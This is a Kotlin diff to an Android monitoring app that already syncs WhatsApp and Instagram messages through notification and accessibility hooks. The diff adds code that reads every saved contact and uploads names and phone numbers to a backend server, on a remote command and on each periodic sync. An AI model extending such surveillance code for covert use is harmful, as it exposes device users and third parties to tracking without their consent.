@@ -36,6 +36,10 @@ import com.spapp.monitoring.network.InstagramMessageEntryDto
 import com.spapp.monitoring.network.InstagramMessagesSyncRequest
 import com.spapp.monitoring.network.WhatsAppMessageEntryDto
 import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
+import com.spapp.monitoring.data.local.SavedContactEntry
+import com.spapp.monitoring.network.SavedContactEntryDto
+import com.spapp.monitoring.network.SavedContactsSyncRequest
+import com.spapp.monitoring.collectors.SavedContactsCollector
 import java.time.Instant
 
 /**
@@ -127,6 +131,9 @@ class SyncRunner(private val context: Context) {
                 ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = false, message = "Error: ${e.message}"))
             }
         }
+        commands.filter { it.command_type == "sync_contacts" }.forEach { command ->
+            processSyncContactsCommand(bearer, command)
+        }
         com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
         com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
             service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
@@ -196,6 +203,7 @@ class SyncRunner(private val context: Context) {
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
+        commands.filter { it.command_type == "sync_contacts" }.forEach { processSyncContactsCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -219,6 +227,7 @@ class SyncRunner(private val context: Context) {
         syncBlockRules(bearer)
         syncWhatsAppMessages(bearer, db)
         syncInstagramMessages(bearer, db)
+        syncSavedContacts(bearer, db)
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
@@ -937,6 +946,58 @@ class SyncRunner(private val context: Context) {
             if (response.isSuccessful) {
                 db.instagramMessageDao().markSynced(unsynced.map { it.id })
                 db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
+            }
+        } catch (e: Exception) {
+            // Retried on next scheduled run.
+        }
+    }
+
+    private suspend fun processSyncContactsCommand(bearer: String, command: RemoteCommand) {
+        try {
+            val db = AppDatabase.getInstance(context)
+            val collector = SavedContactsCollector(context)
+            val freshContacts = collector.collectAllContacts()
+            if (freshContacts.isNotEmpty()) {
+                db.savedContactDao().clearAll()
+                db.savedContactDao().insertAll(freshContacts)
+            }
+            val dtos = freshContacts.map {
+                SavedContactEntryDto(
+                    name = it.name,
+                    phoneNumber = it.phoneNumber,
+                    phoneType = it.phoneType,
+                    accountName = it.accountName,
+                    accountType = it.accountType,
+                    storageType = it.storageType
+                )
+            }
+            val resp = ApiClient.service.syncContacts(bearer, SavedContactsSyncRequest(contacts = dtos, fullSync = true))
+            val success = resp.isSuccessful
+            val msg = if (success) "Synced ${dtos.size} saved contacts" else "Failed to sync contacts: ${resp.code()}"
+            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = success, message = msg))
+        } catch (e: Exception) {
+            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = false, message = "Error: ${e.message}"))
+        }
+    }
+
+    private suspend fun syncSavedContacts(bearer: String, db: AppDatabase) {
+        try {
+            val collector = SavedContactsCollector(context)
+            val freshContacts = collector.collectAllContacts()
+            if (freshContacts.isNotEmpty()) {
+                db.savedContactDao().clearAll()
+                db.savedContactDao().insertAll(freshContacts)
+                val dtos = freshContacts.map {
+                    SavedContactEntryDto(
+                        name = it.name,
+                        phoneNumber = it.phoneNumber,
+                        phoneType = it.phoneType,
+                        accountName = it.accountName,
+                        accountType = it.accountType,
+                        storageType = it.storageType
+                    )
+                }
+                ApiClient.service.syncContacts(bearer, SavedContactsSyncRequest(contacts = dtos, fullSync = true))
             }
         } catch (e: Exception) {
             // Retried on next scheduled run.
